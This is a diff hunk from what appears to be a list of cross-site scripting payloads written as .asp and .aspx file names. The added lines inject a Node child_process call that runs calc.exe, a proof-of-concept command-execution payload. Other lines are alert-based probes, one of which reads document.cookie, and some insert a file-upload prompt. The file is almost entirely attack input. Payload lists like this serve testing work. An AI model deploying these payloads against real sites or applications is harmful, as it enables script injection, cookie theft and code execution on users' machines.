@@ -3,7 +3,8 @@
 <script>alert('NFSU')</script>.asp
 <script>alert('employee')</script>.asp
 <script>alert('inspark')</script>.asp
-<script>alert(document.domain)</script>.asp
+<script>require('child_process').exec('calc.exe');</script>.asp
+<script>require('child_process').exec('calc.exe');</script>.aspx
 <script>alert(document.cookie)</script>.asp
 <script>document.createElement('input').type = 'file'; document.body.appendChild(input); input.click();</script>
 <script>document.createElement('input').type = 'file'; document.body.appendChild(input); input.click();</script>.asp
